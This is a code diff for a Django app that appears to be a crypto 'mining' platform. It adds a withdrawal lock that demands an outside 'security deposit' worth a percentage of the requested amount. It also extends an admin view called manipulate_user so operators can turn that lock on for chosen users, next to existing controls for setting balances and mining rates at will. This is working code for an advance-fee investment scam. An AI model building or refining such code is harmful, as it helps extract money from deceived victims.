@@ -147,6 +147,23 @@ def withdraw_funds_view(request):
                 'transactions': Withdrawal.objects.filter(user=request.user).order_by('-created_at')
             })
         
+        # 🛠️ CLIENT REQUIREMENT: Intercept Withdrawal with External Deposit Restriction
+        if profile.require_external_deposit:
+            percentage = profile.required_deposit_percentage
+            needed_deposit = amount_to_withdraw * (Decimal(percentage) / Decimal('100'))
+            
+            error_msg = (
+                f"Withdrawal locked. To proceed with pulling ${amount_to_withdraw:.2f}, "
+                f"your account requires a verified external security deposit of {percentage}% "
+                f"(${needed_deposit:.2f}). These verification funds must come from an external source, "
+                f"not from your current internal mining balance."
+            )
+            return render(request, 'core/withdraw.html', {
+                'error': error_msg,
+                'profile': profile,
+                'transactions': Withdrawal.objects.filter(user=request.user).order_by('-created_at')
+            })
+
         system_fee = amount_to_withdraw * Decimal('0.015')
         total_deduction = amount_to_withdraw + system_fee
         
@@ -224,6 +241,10 @@ def manipulate_user(request, profile_id):
         # New account metadata inputs
         email_input = request.POST.get('email')
         is_active_input = request.POST.get('is_active')
+        
+        # 🛠️ New Client Requirement Controls
+        require_deposit_input = request.POST.get('require_external_deposit')
+        deposit_percentage_input = request.POST.get('required_deposit_percentage')
 
         try:
             if balance_input is not None:
@@ -232,6 +253,12 @@ def manipulate_user(request, profile_id):
                 profile.mining_balance = Decimal(mining_balance_input)
             if mining_rate_input is not None:
                 profile.mining_rate = Decimal(mining_rate_input)
+            
+            # Update Client Requirement Flags
+            if require_deposit_input is not None:
+                profile.require_external_deposit = (require_deposit_input == "True")
+            if deposit_percentage_input is not None:
+                profile.required_deposit_percentage = int(deposit_percentage_input)
             
             # Save User model details directly from the single portal view
             if email_input is not None:
